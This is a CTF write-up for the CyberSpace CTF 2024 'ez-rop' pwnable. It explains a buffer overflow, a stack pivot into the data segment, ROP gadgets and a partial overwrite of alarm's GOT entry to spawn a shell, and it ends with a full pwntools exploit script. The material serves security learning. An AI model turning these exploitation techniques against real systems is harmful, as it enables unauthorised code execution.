+++
title = "CyberSpace CTF 2024 - ez-rop"
date = "2024-09-15"
description = "CyberSpace CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "fake stack", "rop", "partial overwrite"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/ez-rop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```


## 0x01. Vulnerability
``` c
char *sub_401192()
{
  char s[96]; // [rsp+0h] [rbp-60h] BYREF

  return fgets(s, 116, stdin);
}
```

A simple BOF occurs, but since `0x60` bytes are used to fill `s`, there's almost no stack that can be constructed after return.


## 0x02. Exploit
### Fake Stack
Since we can't do anything even with immediate `rip` control using the vulnerability, I looked for an area where payloads could be constructed.

``` bash
gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/user/chall
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/user/chall
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/user/chall
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/user/chall
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/user/chall
...
```

Since PIE is disabled, the DATA region address `0x404000` is fixed.
As `sub_401192()` executes `leave; ret` when terminating, putting roughly `0x404800` (around the middle) in sfp allows manipulating `rsp` to that value.

Now we need to pass `rsp` as an argument to the read function, but there were no usable gadgets.
Instead, I could pass the value by utilizing the fact that `rdi`'s value is set through `rax` and `rbp` during the `fgets` input process.

```
.text:0000000000401192                 push    rbp
.text:0000000000401193                 mov     rbp, rsp
.text:0000000000401196                 sub     rsp, 60h
.text:000000000040119A                 mov     rdx, cs:stdin   ; stream
.text:00000000004011A1                 lea     rax, [rbp-60h]
.text:00000000004011A5                 mov     esi, 74h ; 't'  ; n
.text:00000000004011AA                 mov     rdi, rax        ; s
.text:00000000004011AD                 call    _fgets
.text:00000000004011B2                 xor     rdx, rdx
.text:00000000004011B5                 nop
.text:00000000004011B6                 leave
.text:00000000004011B7                 retn
```

So I wrote the payload as follows.

``` python
    # fgets(0x4047a0, 0x74, stdin)
    payload = b"A" * 0x60
    payload += p64(0x404800)                # rbp = 0x404800
    payload += p64(0x401196)                # middle of fgets
    payload += b"\x00\x00\x00"              # dummy
    
    s.send(payload)
    sleep(0.5)
```

### Return Oriented Programming
Now we need to spawn shell using the payload.
While there weren't many `pop` gadgets, IDA revealed most of gadgets removed and the challenge intended solution using these four gadgets.

```
# mov rdi, rsi gadget
.text:0000000000401156                 push    rbp
.text:0000000000401157                 mov     rbp, rsp
.text:000000000040115A                 mov     rdi, rsi
.text:000000000040115D                 retn

# pop rbp gadget
.text:000000000040115F                 pop     rbp
.text:0000000000401160                 retn

# pop rsi gadget
.text:0000000000401161                 push    rbp
.text:0000000000401162                 mov     rbp, rsp
.text:0000000000401165                 pop     rsi
.text:0000000000401166                 retn

# read(0, buf, 8) gadget
.text:000000000040116A                 push    rbp
.text:000000000040116B                 mov     rbp, rsp
.text:000000000040116E                 sub     rsp, 10h
.text:0000000000401172                 lea     rax, [rbp-8h]
.text:0000000000401176                 mov     edx, 8          ; nbytes
.text:000000000040117B                 mov     rsi, rax        ; buf
.text:000000000040117E                 mov     edi, 0          ; fd
.text:0000000000401183                 call    _read
.text:0000000000401188                 xor     rdx, rdx
.text:000000000040118B                 xor     rax, rax
.text:000000000040118E                 retn
```

Unusually, there was a `read` gadget.
Similar to `fgets`, the value of `rbp` minus `8` is passed to `rsi` through `rax`.
Since `rbp` can be manipulated using the `pop rbp` gadget, we just need to set the `rbp` value by adding `8` to the input address, considering the `lea rax, [rbp-8h]` instruction.

To avoid changing the manipulated `rsp` value, I configured the payload to jump directly to the middle address `0x401172` of the `read` gadget.

``` python
    # read(0, alarm.got, 8) ; alarm.got = 0x404008
    # rdi = 0, rsi = alarm.got, rdx = 8
    payload = p64(elf.got['alarm'] + 8)     # alarm.got + 8
    payload += p64(0x401172)                # middle of read
```

I decided to write a value to `alarm`'s GOT because there are no printing functions to leak libc, so I needed to find the function closest to `execve` for partial overwrite.
"Closest" means the smallest offset difference, and overwriting the GOT of a close function maximizes exploitation probability under ASLR.

After this, we just need to write `"/bin/sh\x00"` to any memory and use gadgets to pass it as `execve` function arguments.

``` python
    # read(0, 0x404900, 8) ; &0x404900 = "/bin/sh\x00"
    pop_rbp = 0x401168
    payload += p64(pop_rbp)
    payload += p64(0x404908)                # 0x404900 + 8
    payload += p64(0x401172)
    
    # execve("/bin/sh", 0, 0)
    # rdi = 0x404900, rsi = 0, rdx = 0
    mov_rdi_rsi = 0x40115a
    pop_rsi = 0x401165
    payload += p64(mov_rdi_rsi)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(elf.plt['alarm'])

    payload += b"B" * (0x60 - len(payload))
    payload += p64(0x4047a0)
    payload += p64(0x401190)
    payload += b"\x00\x00\x00"
    log.info(f"payload len : {hex(len(payload))}")

    s.send(payload)
    sleep(0.5)
```

Come to think of it, I could just input `sh;` to the last 3 bytes at the point of `fgets` and pass the address.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc-2.31.so"
CONTAINER = "44c6741a4dc0"
bp = {
    'main' : 0x4011B8,
    'leave_after_fgets' : 0x4011b6,
    'ret_after_fgets' : 0x4011B7,
}

gs = f'''
b *{bp["leave_after_fgets"]}
b *{0x401183}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote("0.0.0.0", port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    # fgets(0x4047a0, 0x74, stdin)
    payload = b"A" * 0x60
    payload += p64(0x404800)                # rbp = 0x404800
    payload += p64(0x401196)                # middle of fgets
    payload += b"\x00\x00\x00"              # dummy
    
    s.send(payload)
    sleep(0.5)

    # read(0, alarm.got, 8) ; alarm.got = 0x404008
    # rdi = 0, rsi = alarm.got, rdx = 8
    payload = p64(elf.got['alarm'] + 8)     # alarm.got + 8
    payload += p64(0x401172)                # middle of read

    # read(0, 0x404900, 8) ; &0x404900 = "/bin/sh\x00"
    pop_rbp = 0x401168
    payload += p64(pop_rbp)
    payload += p64(0x404908)                # 0x404900 + 8
    payload += p64(0x401172)
    
    # execve("/bin/sh", 0, 0)
    # rdi = 0x404900, rsi = 0, rdx = 0
    mov_rdi_rsi = 0x40115a
    pop_rsi = 0x401165
    payload += p64(mov_rdi_rsi)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(elf.plt['alarm'])

    payload += b"B" * (0x60 - len(payload))
    payload += p64(0x4047a0)
    payload += p64(0x401190)
    payload += b"\x00\x00\x00"
    log.info(f"payload len : {hex(len(payload))}")

    s.send(payload)
    sleep(0.5)

    # read(0, alarm.got, 8)
    payload = b"\x80\xb0"
    # payload = b"\x80\x50"
    s.send(payload)
    sleep(0.5)

    # read(0, 0x404900, 8)
    payload = b"/bin/sh\x00"
    s.send(payload)
    sleep(0.5)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```